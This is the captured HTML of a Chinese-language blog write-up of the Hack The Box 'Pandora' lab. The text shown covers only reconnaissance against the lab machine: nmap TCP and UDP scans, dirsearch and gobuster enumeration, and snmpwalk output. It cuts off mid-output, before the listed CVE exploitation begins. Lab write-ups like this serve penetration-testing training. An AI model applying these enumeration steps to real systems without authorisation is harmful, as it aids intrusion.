

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme=auto>



<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
  <link rel="icon" href="/img/fluid.png">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="author" content="shiyan">
  <meta name="keywords" content="">
  
    <meta name="description" content="0x00 靶场技能介绍章节技能：snmp信息泄露、SSH端口转发、CVE-2020-5844漏洞利用、CVE-2021-32099漏洞利用、tar环境变量错配利用">
<meta property="og:type" content="article">
<meta property="og:title" content="Pandora-htb-writeup">
<meta property="og:url" content="https://sh1yan.top/2023/12/27/Pandora-htb-writeup/index.html">
<meta property="og:site_name" content="sh1yan&#39;blog">
<meta property="og:description" content="0x00 靶场技能介绍章节技能：snmp信息泄露、SSH端口转发、CVE-2020-5844漏洞利用、CVE-2021-32099漏洞利用、tar环境变量错配利用">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://sh1yan.top/photo/Pandora-htb-writeup/1.png">
<meta property="og:image" content="http://sh1yan.top/photo/Pandora-htb-writeup/2.png">
<meta property="og:image" content="http://sh1yan.top/photo/Pandora-htb-writeup/3.png">
<meta property="og:image" content="http://sh1yan.top/photo/Pandora-htb-writeup/4.png">
<meta property="og:image" content="http://sh1yan.top/photo/Pandora-htb-writeup/5.png">
<meta property="og:image" content="http://sh1yan.top/photo/Pandora-htb-writeup/6.png">
<meta property="og:image" content="http://sh1yan.top/photo/Pandora-htb-writeup/7.png">
<meta property="article:published_time" content="2023-12-27T15:50:55.000Z">
<meta property="article:modified_time" content="2023-12-31T14:55:06.953Z">
<meta property="article:author" content="shiyan">
<meta property="article:tag" content="shooting-range">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="http://sh1yan.top/photo/Pandora-htb-writeup/1.png">
  
  
  
  <title>Pandora-htb-writeup - sh1yan&#39;blog</title>

  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />



  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />



<!-- 主题依赖的图标库，不要自行修改 -->
<!-- Do not modify the link that theme dependent icons -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">


<link  rel="stylesheet" href="/css/main.css" />


  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
  
    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
  




  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    Fluid.ctx = Object.assign({}, Fluid.ctx)
    var CONFIG = {"hostname":"sh1yan.top","root":"/","version":"1.9.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};

    if (CONFIG.web_analytics.follow_dnt) {
      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
    }
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
  


  
<meta name="generator" content="Hexo 6.3.0"></head>


<body>
  

  <header>
    

<div class="header-inner" style="height: 70vh;">
  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>sh1yan&#39;blog</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/" target="_self">
                <i class="iconfont icon-home-fill"></i>
                <span>首页</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/" target="_self">
                <i class="iconfont icon-archive-fill"></i>
                <span>归档</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/" target="_self">
                <i class="iconfont icon-tags-fill"></i>
                <span>标签</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/" target="_self">
                <i class="iconfont icon-user-fill"></i>
                <span>关于</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/yqlj/" target="_self">
                <i class="iconfont icon-link-fill"></i>
                <span>友链</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item dropdown">
              <a class="nav-link dropdown-toggle" target="_self" href="javascript:;" role="button"
                 data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
                <i class="iconfont icon-th-large"></i>
                <span>其他</span>
              </a>
              <div class="dropdown-menu" aria-labelledby="navbarDropdown">
                
                  
                  
                  
                  <a class="dropdown-item" href="/open-source/" target="_self">
                    
                    <span>我开源的安全项目</span>
                  </a>
                
                  
                  
                  
                  <a class="dropdown-item" href="/rt-cmd/" target="_self">
                    
                    <span>反弹shell命令集合</span>
                  </a>
                
                  
                  
                  
                  <a class="dropdown-item" href="/P2note/" target="_self">
                    
                    <span>综合安全工具集合</span>
                  </a>
                
                  
                  
                  
                  <a class="dropdown-item" href="/WebDeveloper/" target="_self">
                    
                    <span>网站开发者工具箱</span>
                  </a>
                
                  
                  
                  
                  <a class="dropdown-item" href="/linux-command/" target="_self">
                    
                    <span>Linux命令工具箱</span>
                  </a>
                
                  
                  
                  
                  <a class="dropdown-item" href="/CyberChef/" target="_self">
                    
                    <span>CyberChef工具箱</span>
                  </a>
                
                  
                  
                  
                  <a class="dropdown-item" href="/Quick-Reference/" target="_self">
                    
                    <span>开发者速查备忘录</span>
                  </a>
                
              </div>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              <i class="iconfont icon-search"></i>
            </a>
          </li>
          
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
            </a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

  

<div id="banner" class="banner" parallax=true
     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
  <div class="full-bg-img">
    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
      <div class="banner-text text-center fade-in-up">
        <div class="h2">
          
            <span id="subtitle" data-typed-text="Pandora-htb-writeup"></span>
          
        </div>

        
          
  <div class="mt-3">
    
    
      <span class="post-meta">
        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
        <time datetime="2023-12-27 23:50" pubdate>
          2023年12月27日 晚上
        </time>
      </span>
    
  </div>

  <div class="mt-1">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-chart"></i>
        
          45k 字
        
      </span>
    

    
      <span class="post-meta mr-2">
        <i class="iconfont icon-clock-fill"></i>
        
        
        
          377 分钟
        
      </span>
    

    
    
  </div>


        
      </div>

      
    </div>
  </div>
</div>

</div>

  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="side-col d-none d-lg-block col-lg-2">
      

    </div>

    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div id="board">
          <article class="post-content mx-auto">
            <h1 id="seo-header">Pandora-htb-writeup</h1>
            
            
              <div class="markdown-body">
                
                <h4 id="0x00-靶场技能介绍"><a href="#0x00-靶场技能介绍" class="headerlink" title="0x00 靶场技能介绍"></a>0x00 靶场技能介绍</h4><p>章节技能：snmp信息泄露、SSH端口转发、CVE-2020-5844漏洞利用、CVE-2021-32099漏洞利用、tar环境变量错配利用</p>
<span id="more"></span>  

<p>参考链接：<code>https://0xdf.gitlab.io/2022/05/21/htb-pandora.html</code></p>
<p>参考链接：<code>https://siunam321.github.io/ctf/hackthebox/Pandora/</code></p>
<h4 id="0x01-用户权限获取"><a href="#0x01-用户权限获取" class="headerlink" title="0x01 用户权限获取"></a>0x01 用户权限获取</h4><p>1、获取下靶机IP地址：10.10.11.136</p>
<p>2、测试下靶机的连通率</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/桌面]<br>└─$ ping 10.10.11.136 -c 4                                          <br>PING 10.10.11.136 (10.10.11.136) 56(84) bytes of data.<br>64 bytes from 10.10.11.136: icmp_seq=1 ttl=63 time=286 ms<br>64 bytes from 10.10.11.136: icmp_seq=2 ttl=63 time=275 ms<br>64 bytes from 10.10.11.136: icmp_seq=3 ttl=63 time=285 ms<br>64 bytes from 10.10.11.136: icmp_seq=4 ttl=63 time=383 ms<br><br>--- 10.10.11.136 ping statistics ---<br>4 packets transmitted, 4 received, 0% packet loss, time 3005ms<br>rtt min/avg/max/mdev = 275.412/307.245/383.245/44.061 ms<br></code></pre></td></tr></table></figure>

<p>3、扫描下靶机开放端口信息</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/桌面]<br>└─$ sudo nmap -p- --min-rate=10000 -oG allports 10.10.11.136<br>[sudo] kali 的密码：<br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-12-27 09:09 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 10.10.11.136<br>Host is up (0.30s latency).<br>Not shown: 65533 closed tcp ports (reset)<br>PORT   STATE SERVICE<br>22/tcp open  ssh<br>80/tcp open  http<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 10.32 seconds<br><br>┌──(kali㉿kali)-[~/桌面]<br>└─$ sudo nmap -sV -sC -p22,80 -Pn --min-rate=10000 10.10.11.136<br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-12-27 09:09 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 10.10.11.136<br>Host is up (0.28s latency).<br><br>PORT   STATE SERVICE VERSION<br>22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)<br>| ssh-hostkey: <br>|   3072 24:c2:95:a5:c3:0b:3f:f3:17:3c:68:d7:af:2b:53:38 (RSA)<br>|   256 b1:41:77:99:46:9a:6c:5d:d2:98:2f:c0:32:9a:ce:03 (ECDSA)<br>|_  256 e7:36:43:3b:a9:47:8a:19:01:58:b2:bc:89:f6:51:08 (ED25519)<br>80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))<br>|_http-server-header: Apache/2.4.41 (Ubuntu)<br>|_http-title: Play | Landing<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 17.10 seconds<br></code></pre></td></tr></table></figure>

<p>4、这里查看下网站首页文件</p>
<p><img src="http://sh1yan.top/photo/Pandora-htb-writeup/1.png" srcset="/img/loading.gif" lazyload></p>
<p>5、首页存在一个域名，我们做一下hosts绑定</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/桌面]<br>└─$ <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;10.10.11.136 panda.htb&quot;</span> | sudo <span class="hljs-built_in">tee</span> -a /etc/hosts<br>10.10.11.136 panda.htb<br></code></pre></td></tr></table></figure>

<p>6、开启目录扫描</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/桌面]<br>└─$ dirsearch -u http://panda.htb/                     <br>/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html<br>  from pkg_resources import DistributionNotFound, VersionConflict<br><br>  _|. _ _  _  _  _ _|_    v0.4.3<br> (_||| _) (/_(_|| (_| )<br><br>Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25<br>Wordlist size: 11460<br><br>Output File: /home/kali/桌面/reports/http_panda.htb/__23-12-27_09-15-43.txt<br><br>Target: http://panda.htb/<br><br>[09:15:43] Starting: <br>[09:15:55] 403 -  274B  - /.ht_wsr.txt                                      <br>[09:15:55] 403 -  274B  - /.htaccess.bak1                                   <br>[09:15:56] 403 -  274B  - /.htaccess.orig                                   <br>[09:15:56] 403 -  274B  - /.htaccess.sample<br>[09:15:56] 403 -  274B  - /.htaccess.save<br>[09:15:56] 403 -  274B  - /.htaccess_extra                                  <br>[09:15:56] 403 -  274B  - /.htaccess_orig<br>[09:15:56] 403 -  274B  - /.htaccess_sc<br>[09:15:56] 403 -  274B  - /.htaccessBAK<br>[09:15:56] 403 -  274B  - /.htaccessOLD<br>[09:15:56] 403 -  274B  - /.htaccessOLD2<br>[09:15:56] 403 -  274B  - /.htm                                             <br>[09:15:56] 403 -  274B  - /.html<br>[09:15:56] 403 -  274B  - /.htpasswd_test                                   <br>[09:15:56] 403 -  274B  - /.htpasswds                                       <br>[09:15:56] 403 -  274B  - /.httr-oauth<br>[09:16:00] 403 -  274B  - /.php                                             <br>[09:16:47] 200 -  476B  - /assets/                                          <br>[09:16:47] 301 -  307B  - /assets  -&gt;  http://panda.htb/assets/             <br>[09:18:04] 403 -  274B  - /server-status                                    <br>[09:18:04] 403 -  274B  - /server-status/ <br><br>Task Completed<br><br>┌──(kali㉿kali)-[~/桌面]<br>└─$ gobuster <span class="hljs-built_in">dir</span> -u http://panda.htb/ --wordlist=/usr/share/dirb/wordlists/common.txt<br>===============================================================<br>Gobuster v3.6<br>by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)<br>===============================================================<br>[+] Url:                     http://panda.htb/<br>[+] Method:                  GET<br>[+] Threads:                 10<br>[+] Wordlist:                /usr/share/dirb/wordlists/common.txt<br>[+] Negative Status codes:   404<br>[+] User Agent:              gobuster/3.6<br>[+] Timeout:                 10s<br>===============================================================<br>Starting gobuster <span class="hljs-keyword">in</span> directory enumeration mode<br>===============================================================<br>/.htaccess            (Status: 403) [Size: 274]<br>/.hta                 (Status: 403) [Size: 274]<br>/.htpasswd            (Status: 403) [Size: 274]<br>/assets               (Status: 301) [Size: 307] [--&gt; http://panda.htb/assets/]<br>/index.html           (Status: 200) [Size: 33560]<br>/server-status        (Status: 403) [Size: 274]<br>Progress: 4614 / 4615 (99.98%)<br>===============================================================<br>Finished<br>===============================================================<br></code></pre></td></tr></table></figure>

<p>7、没有什么有用的收获，这里继续做一下子域名挖掘查看</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/桌面]<br>└─$ gobuster dns -d panda.htb -w /usr/share/dnsrecon/subdomains-top1mil-5000.txt<br>===============================================================<br>Gobuster v3.6<br>by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)<br>===============================================================<br>[+] Domain:     panda.htb<br>[+] Threads:    10<br>[+] Timeout:    1s<br>[+] Wordlist:   /usr/share/dnsrecon/subdomains-top1mil-5000.txt<br>===============================================================<br>Starting gobuster <span class="hljs-keyword">in</span> DNS enumeration mode<br>===============================================================<br>Progress: 5000 / 5001 (99.98%)<br>===============================================================<br>Finished<br>===============================================================<br></code></pre></td></tr></table></figure>

<p>8、这里同样没有什么收获，且我各种网站的信息检索也没有发现什么有用的信息，但是我在端口收集的时候少了一个udp的扫描，这里的扫描，发现了一些信息</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/桌面]<br>└─$ sudo nmap -sU 10.10.11.136 -p- --min-rate=10000            <br>[sudo] kali 的密码：<br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-12-27 09:46 CST<br>Warning: 10.10.11.136 giving up on port because retransmission <span class="hljs-built_in">cap</span> hit (10).<br>Nmap scan report <span class="hljs-keyword">for</span> panda.htb (10.10.11.136)<br>Host is up (0.29s latency).<br>Not shown: 65455 open|filtered udp ports (no-response), 79 closed udp ports (port-unreach)<br>PORT    STATE SERVICE<br>161/udp open  snmp<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 74.51 seconds<br></code></pre></td></tr></table></figure>

<p>9、这里发现了snmp协议，这里可以获取到很多信息</p>
<p><code>SNMP - 简单网络管理协议是一种用于监控网络中不同设备（如路由器、交换机、打印机、物联网……）的协议。</code></p>
<p><code>为了确保 SNMP 访问能够跨制造商和不同的客户端-服务器组合工作，创建了管理信息库 (MIB) 。MIB是一种用于存储设备信息的独立格式。MIB 是一个文本文件，其中设备的所有可查询SNMP 对象都以标准化树形层次结构列出。它至少包含一个 **Object Identifier** ( **OID**)，除了必要的唯一地址和名称Abstract Syntax Notation One之外，还提供有关类型、访问权限的信息，以及以基于( ASN.1) 的 ASCII 文本格式编写的各个对象 MIB 文件的描述。MIB不包含数据，但它们解释了在哪里可以找到哪些信息及其外观、返回特定 OID 的值或使用哪种数据类型。</code></p>
<p><code>OID代表对象ID实体。OID 唯一地标识 MIB 层次结构中的托管对象。这可以被描述为一棵树，其级别由不同的组织分配。顶级 MIB 对象 ID (OID) 属于不同的标准组织。供应商定义私有分支，包括其自己产品的托管对象。</code></p>
<p><code>https://book.hacktricks.xyz/network-services-pentesting/pentesting-snmp</code></p>
<p>10、我们这里使用 snmpwalk 工具进行信息收集</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/桌面]<br>└─$ snmpwalk -c public -v1 10.10.11.136<br>iso.3.6.1.2.1.1.1.0 = STRING: <span class="hljs-string">&quot;Linux pandora 5.4.0-91-generic #102-Ubuntu SMP Fri Nov 5 16:31:28 UTC 2021 x86_64&quot;</span><br>iso.3.6.1.2.1.1.2.0 = OID: iso.3.6.1.4.1.8072.3.2.10<br>iso.3.6.1.2.1.1.3.0 = Timeticks: (637780) 1:46:17.80<br>iso.3.6.1.2.1.1.4.0 = STRING: <span class="hljs-string">&quot;Daniel&quot;</span><br>iso.3.6.1.2.1.1.5.0 = STRING: <span class="hljs-string">&quot;pandora&quot;</span><br>iso.3.6.1.2.1.1.6.0 = STRING: <span class="hljs-string">&quot;Mississippi&quot;</span><br>iso.3.6.1.2.1.1.7.0 = INTEGER: 72<br>iso.3.6.1.2.1.1.8.0 = Timeticks: (3) 0:00:00.03<br>iso.3.6.1.2.1.1.9.1.3.1 = STRING: <span class="hljs-string">&quot;The SNMP Management Architecture MIB.&quot;</span><br>iso.3.6.1.2.1.1.9.1.3.2 = STRING: <span class="hljs-string">&quot;The MIB for Message Processing and Dispatching.&quot;</span><br>iso.3.6.1.2.1.1.9.1.3.3 = STRING: <span class="hljs-string">&quot;The management information definitions for the SNMP User-based Security Model.&quot;</span><br>iso.3.6.1.2.1.1.9.1.3.4 = STRING: <span class="hljs-string">&quot;The MIB module for SNMPv2 entities&quot;</span><br>iso.3.6.1.2.1.1.9.1.3.5 = STRING: <span class="hljs-string">&quot;View-based Access Control Model for SNMP.&quot;</span><br>iso.3.6.1.2.1.1.9.1.3.6 = STRING: <span class="hljs-string">&quot;The MIB module for managing TCP implementations&quot;</span><br>iso.3.6.1.2.1.1.9.1.3.7 = STRING: <span class="hljs-string">&quot;The MIB module for managing IP and ICMP implementations&quot;</span><br>iso.3.6.1.2.1.1.9.1.3.8 = STRING: <span class="hljs-string">&quot;The MIB module for managing UDP implementations&quot;</span><br>iso.3.6.1.2.1.1.9.1.3.9 = STRING: <span class="hljs-string">&quot;The MIB modules for managing SNMP Notification, plus filtering.&quot;</span><br>iso.3.6.1.2.1.1.9.1.3.10 = STRING: <span class="hljs-string">&quot;The MIB module for logging SNMP Notifications.&quot;</span><br>iso.3.6.1.2.1.25.4.2.1.4.488 = STRING: <span class="hljs-string">&quot;/lib/systemd/systemd-journald&quot;</span><br>iso.3.6.1.2.1.25.4.2.1.4.515 = STRING: <span class="hljs-string">&quot;/lib/systemd/systemd-udevd&quot;</span><br>iso.3.6.1.2.1.25.4.2.1.4.527 = STRING: <span class="hljs-string">&quot;/lib/systemd/systemd-networkd&quot;</span><br>iso.3.6.1.2.1.25.4.2.1.4.568 = <span class="hljs-string">&quot;&quot;</span><br>iso.3.6.1.2.1.25.4.2.1.4.658 = <span class="hljs-string">&quot;&quot;</span><br>iso.3.6.1.2.1.25.4.2.1.4.659 = <span class="hljs-string">&quot;&quot;</span><br>iso.3.6.1.2.1.25.4.2.1.4.660 = <span class="hljs-string">&quot;&quot;</span><br>iso.3.6.1.2.1.25.4.2.1.4.661 = <span class="hljs-string">&quot;&quot;</span><br>iso.3.6.1.2.1.25.4.2.1.4.662 = STRING: <span class="hljs-string">&quot;/sbin/multipathd&quot;</span><br>iso.3.6.1.2.1.25.4.2.1.4.670 = <span class="hljs-string">&quot;&quot;</span><br>iso.3.6.1.2.1.25.4.2.1.4.671 = <span class="hljs-string">&quot;&quot;</span><br>iso.3.6.1.2.1.25.4.2.1.4.682 = STRING: <span class="hljs-string">&quot;/lib/systemd/systemd-resolved&quot;</span><br>iso.3.6.1.2.1.25.4.2.1.4.684 = STRING: <span class="hljs-string">&quot;/lib/systemd/systemd-timesyncd&quot;</span><br>iso.3.6.1.2.1.25.4.2.1.4.702 = STRING: <span class="hljs-string">&quot;/usr/bin/VGAuthService&quot;</span><br>iso.3.6.1.2.1.25.4.2.1.4.711 = STRING: <span class="hljs-string">&quot;/usr/bin/vmtoolsd&quot;</span><br>iso.3.6.1.2.1.25.4.2.1.4.756 = STRING: <span class="hljs-string">&quot;/usr/lib/accountsservice/accounts-daemon&quot;</span><br>iso.3.6.1.2.1.25.4.2.1.4.758 = STRING: <span class="hljs-string">&quot;/usr/bin/dbus-daemon&quot;</span><br>iso.3.6.1.2.1.25.4.2.1.4.779 = STRING: <span class="hljs-string">&quot;/usr/sbin/irqbalance&quot;</span><br>iso.3.6.1.2.1.25.4.2.1.4.780 = STRING: <span class="hljs-string">&quot;/usr/bin/python3&quot;</span><br>iso.3.6.1.2.1.25.4.2.1.4.781 = STRING: <span class="hljs-string">&quot;/usr/sbin/rsyslogd&quot;</span><br>iso.3.6.1.2.1.25.4.2.1.4.789 = STRING: <span class="hljs-string">&quot;/lib/systemd/systemd-logind&quot;</span><br>iso.3.6.1.2.1.25.4.2.1.4.790 = STRING: <span class="hljs-string">&quot;/usr/lib/udisks2/udisksd&quot;</span><br>iso.3.6.1.2.1.25.4.2.1.4.828 = STRING: <span class="hljs-string">&quot;/usr/sbin/cron&quot;</span><br>iso.3.6.1.2.1.25.4.2.1.4.832 = STRING: <span class="hljs-string">&quot;/usr/sbin/CRON&quot;</span><br>iso.3.6.1.2.1.25.4.2.1.4.847 = STRING: <span 